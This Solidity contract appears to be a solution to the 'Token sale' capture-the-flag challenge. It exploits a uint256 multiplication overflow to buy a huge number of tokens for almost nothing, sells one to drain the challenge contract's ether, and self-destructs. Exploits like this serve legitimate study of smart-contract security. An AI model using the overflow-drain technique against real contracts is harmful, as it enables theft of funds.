pragma solidity ^0.4.21;

import "./TokenSaleChallenge.sol";

contract TokenSaleSolver {
    TokenSaleChallenge public challenge;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleSolver(address _challenge) public payable {
        challenge = TokenSaleChallenge(_challenge);
        uint256 numTokens = (uint256(-1) / PRICE_PER_TOKEN) + 1;
        uint256 value = PRICE_PER_TOKEN * numTokens;
        require(msg.value == value);
        challenge.buy.value(value)(numTokens);
        challenge.sell(1 + value / PRICE_PER_TOKEN);
        require(address(challenge).balance < 1 ether);
        selfdestruct(msg.sender);
    }

}
